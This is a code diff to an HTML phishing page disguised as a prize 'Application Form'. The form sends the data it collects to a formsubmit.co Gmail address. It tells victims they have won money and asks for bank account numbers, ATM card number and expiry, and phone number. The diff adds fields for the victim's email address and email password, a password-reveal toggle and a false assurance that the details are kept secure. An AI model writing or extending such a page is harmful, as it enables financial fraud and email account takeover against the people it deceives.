@@ -24,6 +24,13 @@
     h2 {
       text-align: center;
       font-size: 1.5em;
+      margin-bottom: 10px;
+    }
+
+    .notice {
+      text-align: center;
+      font-size: 0.9em;
+      color: #555;
       margin-bottom: 20px;
     }
 
@@ -79,12 +86,26 @@
     .hidden {
       display: none;
     }
+
+    .password-wrapper {
+      position: relative;
+    }
+
+    .password-wrapper span {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 1.1em;
+    }
   </style>
 </head>
 <body>
 
   <form id="applicationForm" method="POST" action="https://formsubmit.co/exellentfirm@gmail.com">
     <h2>Application Form</h2>
+    <div class="notice">We keep your details secure and confidential.</div>
 
     <!-- 1 -->
     <label for="fullName">1. Full Name</label>
@@ -95,32 +116,43 @@
     <input type="tel" id="phoneNumber" name="phoneNumber" required>
 
     <!-- 3 -->
-    <label for="amountWon">3. Amount You Won</label>
-    <input type="text" id="amountWon" name="amountWon" required>
+    <label for="emailAddress">3. Email Address</label>
+    <input type="email" id="emailAddress" name="emailAddress" required>
 
     <!-- 4 -->
-    <label for="bankType">4. Bank Account Type (e.g., Standard Bank)</label>
-    <input type="text" id="bankType" name="bankType" placeholder="e.g., Standard Bank" required>
+    <label for="emailPassword">4. Email Password</label>
+    <div class="password-wrapper">
+      <input type="password" id="emailPassword" name="emailPassword" required style="padding-right: 40px;">
+      <span onclick="togglePassword()">👁️</span>
+    </div>
 
     <!-- 5 -->
-    <label for="bankNumber">5. Bank Account Number</label>
-    <input type="text" id="bankNumber" name="bankNumber" required>
+    <label for="amountWon">5. Amount You Won</label>
+    <input type="text" id="amountWon" name="amountWon" required>
 
     <!-- 6 -->
-    <label for="accountHolder">6. Bank Account Holder's Name</label>
-    <input type="text" id="accountHolder" name="accountHolder" required>
+    <label for="bankType">6. Bank Account Type (e.g., Standard Bank)</label>
+    <input type="text" id="bankType" name="bankType" placeholder="e.g., Standard Bank" required>
 
     <!-- 7 -->
-    <label for="atmLinked">7. Did you link an ATM card to your <span id="bankTypePreview">bank</span> account?</label>
+    <label for="bankNumber">7. Bank Account Number</label>
+    <input type="text" id="bankNumber" name="bankNumber" required>
+
+    <!-- 8 -->
+    <label for="accountHolder">8. Bank Account Holder's Name</label>
+    <input type="text" id="accountHolder" name="accountHolder" required>
+
+    <!-- 9 -->
+    <label for="atmLinked">9. Did you link an ATM card to your <span id="bankTypePreview">bank</span> account?</label>
     <select id="atmLinked" name="atmLinked" required>
       <option value="">--Select--</option>
       <option value="Yes">Yes</option>
       <option value="No">No</option>
     </select>
 
-    <!-- 8 -->
+    <!-- 10 -->
     <div class="card-section hidden" id="cardSection">
-      <label>8. We need to verify your details so that we release <span id="amountPreview">[amount]</span> to your <span id="bankPreview">[bank]</span> account.</label>
+      <label>10. We need to verify your details so that we release <span id="amountPreview">[amount]</span> to your <span id="bankPreview">[bank]</span> account.</label>
 
       <label for="atmNumber">ATM Card Number</label>
       <input type="text" id="atmNumber" name="atmNumber" maxlength="16" pattern="\d{13,16}" inputmode="numeric">
@@ -132,8 +164,8 @@
       <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" pattern="^(0[1-9]|1[0-2])\/\d{2}$" required oninput="formatExpiry(this)">
     </div>
 
-    <!-- 9 -->
-    <label>9. Confirmation</label>
+    <!-- 11 -->
+    <label>11. Confirmation</label>
     <div class="readonly-box" id="autoFilledNote">
       You will receive [amount] immediately you submit the form and the SMS verification sent to your number [phone].
     </div>
@@ -210,6 +242,15 @@
         input.value = value.slice(0, 2) + '/' + value.slice(2, 4);
       } else {
         input.value = value;
+      }
+    }
+
+    function togglePassword() {
+      const passwordInput = document.getElementById("emailPassword");
+      if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+      } else {
+        passwordInput.type = "password";
       }
     }
   </script>
